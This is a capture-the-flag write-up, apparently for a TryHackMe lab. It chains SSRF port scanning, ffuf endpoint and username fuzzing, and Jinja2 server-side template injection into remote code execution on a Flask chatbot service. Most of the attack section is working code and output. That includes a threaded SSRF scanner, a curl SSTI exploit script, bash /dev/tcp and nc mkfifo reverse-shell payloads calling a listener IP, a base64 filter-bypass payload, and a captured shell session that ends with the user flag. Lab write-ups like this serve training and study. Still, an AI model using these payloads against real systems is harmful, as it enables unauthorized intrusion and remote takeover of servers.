
### Fuzzing API endpoint 
Added ThreadPoolExecutor for faster scanning. The current scan (ports 1 to 5000) only takes 1 minute and 19 seconds
```py
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

GREEN  = "\033[92m"
RESET  = "\033[0m"

URL = "http://storage.cloudsite.thm/api/store-url"
HEADERS = {
    "Host": "storage.cloudsite.thm",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Referer": "http://storage.cloudsite.thm/dashboard/active",
    "Origin": "http://storage.cloudsite.thm",
    "Cookie": "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4NzgyNzgsImV4cCI6MTc1MTg4MTg3OH0.ZHv1rDMPsCJgL_5ShoZuVe4mXXz1paXO3of1VnEC-8c"  # Replace with your valid JWT
}

def check_port(port):
    json_data = {"url": f"http://127.0.0.1:{port}"}
    try:
        response = requests.post(URL, json=json_data, headers=HEADERS, timeout=3)
        if response.status_code in [200, 301, 302]:
            return f"{GREEN}[+] Port {port} - Status: {response.status_code}{RESET}"
    except requests.exceptions.RequestException:
        pass
    return None

def fuzz_ports(start=1, end=1000, threads=30):
    print(f"[*] Scanning ports {start} to {end}...\n")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_port, port) for port in range(start, end + 1)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(result)

if __name__ == "__main__":
    fuzz_ports(start=1, end=5000, threads=30)
```
### Output 
```bash
> python3 fuzz.py
[*] Scanning ports 1 to 5000...

[+] Port 80 - Status: 200
[+] Port 3000 - Status: 200
~/rabbit >                                                                                                                                  took 1m 19s
```
### Hidden Endpoint 
![chatbot](chatbot.png)


```bash
 
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4NzgyNzgsImV4cCI6MTc1MTg4MTg3OH0.ZHv1rDMPsCJgL_5ShoZuVe4mXXz1paXO3of1VnEC-8c" \
     -H "Origin: http://storage.cloudsite.thm" \
     -H "Referer: http://storage.cloudsite.thm/dashboard/active" \
     -u http://storage.cloudsite.thm/api/store-url \
     -d '{"url": "http://127.0.0.1:3000/api/FUZZ"}' \
     -mc 200,301,302 \
     -fw 5 \
     -t 100

```
![user_param](username_param.png)
![user_create](username_create.png)

### Fuzz username parameter 
```bash
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4ODE3NTksImV4cCI6MTc1MTg4NTM1OX0.AOrjl_6jUB-5b5y0CQBX_MiUmT0l692nsXzuxk9T-38" \
     -u http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot \
     -d '{"username": "FUZZ"}' \
     -mr "chatbot server is currently under development" \
     -t 50


root                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 307ms]
user                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 308ms]
ftp                     [Status: 200, Size: 282, Words: 37, Lines: 11, Duration: 351ms]
oracle                  [Status: 200, Size: 285, Words: 37, Lines: 11, Duration: 355ms]
guest                   [Status: 200, Size: 284, Words: 37, Lines: 11, Duration: 359ms]
mysql                   [Status: 200, Size: 284, Words: 37, Lines: 11, Duration: 365ms]
info                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 366ms]
pi                      [Status: 200, Size: 281, Words: 37, Lines: 11, Duration: 365ms]
adm                     [Status: 200, Size: 282, Words: 37, Lines: 11, Duration: 368ms]
azureuser               [Status: 200, Size: 288, Words: 37, Lines: 11, Duration: 371ms]
ansible                 [Status: 200, Size: 286, Words: 37, Lines: 11, Duration: 375ms]
puppet                  [Status: 200, Size: 285, Words: 37, Lines: 11, Duration: 380ms]
vagrant                 [Status: 200, Size: 286, Words: 37, Lines: 11, Duration: 384ms]
test                    [Status: 200, Size: 283, Words: 37, Lines: 11, Duration: 388ms]
ec2-user                [Status: 200, Size: 287, Words: 37, Lines: 11, Duration: 388ms]
admin                   [Status: 200, Size: 284, Words: 37, Lines: 11, Duration: 391ms]
administrator           [Status: 200, Size: 292, Words: 37, Lines: 11, Duration: 392ms]
:: Progress: [17/17] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```
### Security Testing
![xss](xss.png)
![ssti](ssti.png)

<br>

💥 That means the server is rendering the username value through a template engine (most likely Jinja2 or something similar) — and evaluating your expression.

- You're injecting directly into a server-side template.
- Likely template engine: Jinja2 (common in Python apps).

- 🚨 What This Means

- You can now:
    - Read server-side objects, environment, paths, etc.
    - Potentially execute arbitrary OS commands if not sandboxed
    - Escalate to Remote Code Execution (RCE)
### Exploitation SSTI to RCE 
![ssti_config](ssti_config.png)
### cleaning HTML Entity to json 
```json
{
  "DEBUG": true,
  "TESTING": false,
  "PROPAGATE_EXCEPTIONS": null,
  "SECRET_KEY": null,
  "PERMANENT_SESSION_LIFETIME": 31 days,
  "USE_X_SENDFILE": false,
  "SERVER_NAME": null,
  "APPLICATION_ROOT": "/",
  "SESSION_COOKIE_NAME": "session",
  "SESSION_COOKIE_DOMAIN": null,
  "SESSION_COOKIE_PATH": null,
  "SESSION_COOKIE_HTTPONLY": true,
  "SESSION_COOKIE_SECURE": false,
  "SESSION_COOKIE_SAMESITE": null,
  "SESSION_REFRESH_EACH_REQUEST": true,
  "MAX_CONTENT_LENGTH": null,
  "SEND_FILE_MAX_AGE_DEFAULT": null,
  "TRAP_BAD_REQUEST_ERRORS": null,
  "TRAP_HTTP_EXCEPTIONS": false,
  "EXPLAIN_TEMPLATE_LOADING": false,
  "PREFERRED_URL_SCHEME": "http",
  "TEMPLATES_AUTO_RELOAD": null,
  "MAX_COOKIE_SIZE": 4093
}
```
### Exploit SSTI vulnerability and save HTML output (polish)
```bash
#!/bin/bash

URL="http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot"
COOKIE="jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFub24xQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTE4ODE3NTksImV4cCI6MTc1MTg4NTM1OX0.AOrjl_6jUB-5b5y0CQBX_MiUmT0l692nsXzuxk9T-38"
REFERER="http://storage.cloudsite.thm/dashboard/active"
ORIGIN="http://storage.cloudsite.thm"

# JSON payload (escaped properly)
PAYLOAD=$(cat <<EOF
{ "username": "{{''.__class__.__mro__[2].__subclasses__()}}" }
EOF
)
# Output file
OUTPUT_FILE="ssti_response.html"

# Send POST request
curl -s -X POST "$URL" \
     -H "Content-Type: application/json" \
     -H "Cookie: $COOKIE" \
     -H "Referer: $REFERER" \
     -H "Origin: $ORIGIN" \
     -d "$PAYLOAD" \
     -o "$OUTPUT_FILE"

echo "[+] Response saved to $OUTPUT_FILE"

```
![user_ezrael](user_ezrael.png)

### Console Locked 
![console](console_locked.png)

### Jinja2 SSTI → RCE → Reverse Shell   
```bash
> echo 'bash -i >& /dev/tcp/10.23.93.75/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMy45My43NS80NDQ0IDA+JjEK
```
```json
{
  "username": "{{ config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.23.93.75 9001 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read() }}"
}
```
### Other payloads 
[payloads reference](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/)
```py
{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.0.0.1 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f')|attr('read')() }}

# Filter bypass - Base64 encode
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMy45My43NS80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
```

```bash
> rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.23.93.75] from (UNKNOWN) [10.10.18.211] 39948
ls
chatbot.py
__pycache__
templates
python3 -c 'import pty;pty.spawn("/bin/bash")'
azrael@forge:~/chatbotServer$ export TERM=linux 
```
```bash
azrael@forge:~/chatbotServer$ cat /etc/passwd | grep 100
cat /etc/passwd | grep 100
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
azrael:x:1000:1000:KLI:/home/azrael:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
azrael@forge:~/chatbotServer$ 
```
### Pivoting 
```bash
azrael@forge:/var/www/cloudsite.thm/assets$ ls
config-scss.bat  css  font  fonts  images  js  plugins  scss  webfonts
azrael@forge:/var/www/cloudsite.thm/assets$ cat *.bat
cat *.bat
cd E:\smarteye\consulting\3\html\assets
sass --watch scss/style.scss:css/style.css
azrael@forge:/var/www/cloudsite.thm/assets$ 

```

### Flags 
- user flags
```bash
azrael@forge:~$ cat user.txt 
cat user.txt 
98d3a30fa86523c580144d317be0c47e
```

